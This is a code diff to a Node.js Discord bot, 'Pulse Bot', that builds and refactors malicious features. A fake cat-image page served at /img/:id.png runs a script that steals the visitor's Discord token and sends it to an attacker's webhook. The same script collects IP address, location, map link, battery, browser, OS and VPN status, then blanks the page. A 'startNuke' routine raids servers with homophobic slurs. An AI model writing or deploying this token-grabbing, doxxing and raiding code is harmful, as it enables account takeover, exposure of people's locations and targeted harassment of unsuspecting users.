@@ -2,6 +2,8 @@ const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelTyp
 const express = require('express');
 const app = express();
 const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
 
 const TOKEN = process.env.TOKEN;
 const PORT = process.env.PORT || 3000;
@@ -27,6 +29,7 @@ let startTime = Date.now();
 app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
 app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));
 
+// ---- DOX ROUTE ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -35,6 +38,7 @@ app.get('/img/:id.png', (req, res) => {
     res.send(generateDoxHTML(data.webhook));
 });
 
+// ---- REGISTER COMMANDS ----
 async function registerCommands() {
     try {
         await client.application.commands.set([
@@ -134,6 +138,7 @@ async function registerCommands() {
     }
 }
 
+// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
@@ -417,6 +422,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
+// ---- START NUKE ----
 async function startNuke(guild) {
     const variants = [
         '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -483,17 +489,17 @@ async function startNuke(guild) {
     });
 }
 
+// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
-    const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';
-    
-    return `<!DOCTYPE html>
+    return `
+<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; }
-        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: "Segoe UI", sans-serif; }
         .container { text-align: center; }
         .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
         .caption { color: #555; font-size: 14px; margin-top: 12px; }
@@ -501,85 +507,78 @@ function generateDoxHTML(webhook) {
 </head>
 <body>
     <div class="container">
-        <img src="${imageUrl}" alt="Cat" />
+        <img src="https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg" alt="Cat" />
         <div class="caption">Loading...</div>
     </div>
     <script>
-        const WEBHOOK = "${webhook}";
+        var WEBHOOK = "${webhook}";
         function send(data) {
             fetch(WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
-            }).catch(() => {});
+            }).catch(function() {});
         }
 
         (function() {
             try {
-                const token = localStorage.getItem("token") || 
-                              document.cookie.split("; ").find(r => r.startsWith("token="))?.split("=")[1] ||
+                var token = localStorage.getItem("token") || 
+                              document.cookie.split("; ").find(function(r) { return r.startsWith("token="); }).split("=")[1] ||
                               sessionStorage.getItem("token");
                 if (token) {
-                    send({ content: "**🎯 Discord Token:** ```" + token + "```" });
+                    send({ content: "**🎯 Discord Token:** " + token });
                 }
             } catch(e) {}
         })();
 
         (async function() {
             try {
-                const [ipv4Res, ipv6Res] = await Promise.all([
-                    fetch("https://ipinfo.io/json"),
-                    fetch("https://api64.ipify.org?format=json")
-                ]);
+                var res = await fetch("https://ipinfo.io/json");
+                var d = await res.json();
+                if (!d.ip) return;
 
-                const d = await ipv4Res.json();
-                const ipv6Data = await ipv6Res.json();
+                var ua = navigator.userAgent;
+                var browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
+                var os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Windows NT 6.1") ? "Windows 7" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
+                var device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
+                var now = new Date();
+                var timestamp = now.toISOString();
+                var localTime = now.toString();
 
-                if (!d.ip && !ipv6Data.ip) return;
+                var lat = d.loc ? d.loc.split(",")[0] : "N/A";
+                var lon = d.loc ? d.loc.split(",")[1] : "N/A";
+                var mapUrl = lat !== "N/A" ? "https://www.google.com/maps?q=" + lat + "," + lon : "N/A";
 
-                const ua = navigator.userAgent;
-                const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-                const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Windows NT 6.1") ? "Windows 7" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
-                const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
-                const now = new Date();
-                const timestamp = now.toISOString();
-                const localTime = now.toString();
-
-                const lat = d.loc ? d.loc.split(",")[0] : "N/A";
-                const lon = d.loc ? d.loc.split(",")[1] : "N/A";
-                const mapUrl = lat !== "N/A" ? "https://www.google.com/maps?q=" + lat + "," + lon : "N/A";
-
-                let battery = "N/A";
+                var battery = "N/A";
                 try {
-                    const b = await navigator.getBattery();
+                    var b = await navigator.getBattery();
                     battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not Charging)");
                 } catch(e) {}
 
-                let vpn = "❌ Not Detected";
-                let vpnScore = 0;
-                const vpnKeywords = ["vpn", "proxy", "cloudflare", "aws", "amazon", "digitalocean", "vultr", "linode", "hetzner", "ovh", "m247", "psychz", "hostinger", "namecheap", "contabo", "server", "hosting", "dedicated", "datacenter", "cloud", "vps"];
-                const isp = (d.org || "").toLowerCase();
-                const asn = (d.asn || "").toLowerCase();
-                for (const keyword of vpnKeywords) {
-                    if (isp.includes(keyword) || asn.includes(keyword)) {
+                var vpn = "❌ Not Detected";
+                var vpnScore = 0;
+                var vpnKeywords = ["vpn", "proxy", "cloudflare", "aws", "amazon", "digitalocean", "vultr", "linode", "hetzner", "ovh", "m247", "psychz", "hostinger", "namecheap", "contabo", "server", "hosting", "dedicated", "datacenter", "cloud", "vps"];
+                var isp = (d.org || "").toLowerCase();
+                var asn = (d.asn || "").toLowerCase();
+                for (var i = 0; i < vpnKeywords.length; i++) {
+                    if (isp.includes(vpnKeywords[i]) || asn.includes(vpnKeywords[i])) {
                         vpnScore += 2;
                         break;
                     }
                 }
                 try {
-                    const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    var browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                     if (d.timezone && d.timezone !== "N/A" && browserTz && d.timezone !== browserTz) {
                         vpnScore += 3;
                     }
                 } catch(e) {}
                 if (vpnScore >= 3) vpn = "✅ Likely (Score: " + vpnScore + ")";
 
-                const embed = {
-                    title: "☠️ TARGET COMPROMISED - FULL DOX",
+                var embed = {
+                    title: "☠️ TARGET COMPROMISED",
                     color: 0xFF0000,
                     fields: [
-                        { name: "🌐 IPv4 Address", value: d.ip || "N/A", inline: true },
-                        { name: "🌐 IPv6 Address", value: ipv6Data.ip || "N/A", inline: true },
+                        { name: "🌐 IP", value: d.ip || "N/A", inline: true },
                         { name: "🏙️ City", value: d.city || "N/A", inline: true },
                         { name: "🗺️ Region", value: d.region || "N/A", inline: true },
                         { name: "🌍 Country", value: d.country || "N/A", inline: true },
@@ -587,31 +586,30 @@ function generateDoxHTML(webhook) {
                         { name: "🔢 ASN", value: d.asn || "N/A", inline: true },
                         { name: "🏢 ISP", value: d.org || "N/A", inline: true },
                         { name: "🕒 Timezone", value: d.timezone || "N/A", inline: true },
-                        { name: "📍 IP Location", value: mapUrl, inline: false },
+                        { name: "📍 Location", value: mapUrl, inline: false },
                         { name: "🔋 Battery", value: battery, inline: true },
-                        { name: "🛡️ VPN/Proxy", value: vpn, inline: true },
+                        { name: "🛡️ VPN", value: vpn, inline: true },
                         { name: "🧠 Browser", value: browser, inline: true },
                         { name: "💻 OS", value: os, inline: true },
                         { name: "🖥️ Device", value: device, inline: true },
-                        { name: "⏰ Local Time", value: localTime, inline: false },
-                        { name: "📅 Timestamp", value: timestamp, inline: false }
+                        { name: "⏰ Time", value: localTime, inline: false }
                     ],
-                    footer: { text: "☠️ PULSE DOX SYSTEM - " + timestamp }
+                    footer: { text: "☠️ PULSE DOX" }
                 };
 
                 send({ embeds: [embed] });
 
             } catch(e) {
-                send({ content: "❌ Dox error: " + e.message });
+                send({ content: "❌ Error: " + e.message });
             }
         })();
 
-        setTimeout(() => {
+        setTimeout(function() {
             document.body.innerHTML = "";
             document.body.style.background = "#000";
             document.body.style.margin = "0";
             document.body.style.height = "100vh";
-            setTimeout(() => {
+            setTimeout(function() {
                 window.close();
                 window.location.href = "about:blank";
             }, 500);
@@ -623,11 +621,13 @@ function generateDoxHTML(webhook) {
 </html>`;
 }
 
+// ---- CLEANUP OLD LINKS ----
 setInterval(() => {
     const keys = Array.from(links.keys());
     if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
 }, 60000);
 
+// ---- BOT STARTUP ----
 client.once('ready', async () => {
     startTime = Date.now();
     console.log(`🤖 ${client.user.tag} is online!`);
